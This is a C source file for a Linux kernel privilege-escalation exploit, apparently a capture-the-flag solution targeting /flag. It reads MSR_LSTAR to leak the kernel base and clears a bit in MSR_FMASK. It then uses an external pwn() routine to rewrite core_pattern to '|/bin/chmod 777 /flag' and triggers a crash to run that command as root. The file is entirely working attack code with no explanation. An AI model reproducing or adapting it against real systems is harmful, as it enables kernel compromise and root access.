#include <fcntl.h>
#include <assert.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <syscall.h>
#include <string.h>

extern uint64_t pwn(int fd, uint64_t kernel_base, size_t index, char new_char);

#define MSR_LSTAR           0xc0000082
#define MSR_FMASK           0xc0000084
#define MSR_LSTAR_OFFSET    0x800040

static uint64_t kernel_base = 0;

void rdmsr(int fd, uint64_t *ptr, uint64_t len, uint32_t reg) {
    syscall(SYS_pread64, fd, ptr, len, reg);
}

void wrmsr(int fd, uint64_t *ptr, uint64_t len, uint32_t reg) {
    syscall(SYS_pwrite64, fd, ptr, len, reg);
}

int main(void)
{
    int fd;

    fd = open("/dev/cpu/0/msr", O_RDWR);
    assert(fd > 0);

    uint64_t msr_lstar = 0;
    rdmsr(fd, &msr_lstar, sizeof(msr_lstar), MSR_LSTAR);

    printf("[+] MSR_LSTAR: %lx\n", msr_lstar);

    kernel_base = msr_lstar - MSR_LSTAR_OFFSET;
    printf("[+] Kernel base: %lx\n", kernel_base);

    uint64_t eflags = 0;
    rdmsr(fd, &eflags, sizeof(eflags), MSR_FMASK);
    eflags &= ~(1ULL << 18);
    wrmsr(fd, &eflags, sizeof(eflags), MSR_FMASK);

    char *new_core_pattern = "|/bin/chmod 777 /flag";
    for (size_t i = 0; i < strlen(new_core_pattern); i++)
        pwn(fd, kernel_base, i, new_core_pattern[i]);

    printf("[+] core_pattern overwritten\n");

    puts("[+] Triggering payload...");
    uint8_t trigger = *(uint8_t *)(0xdeadbeef);

    return 0;
}
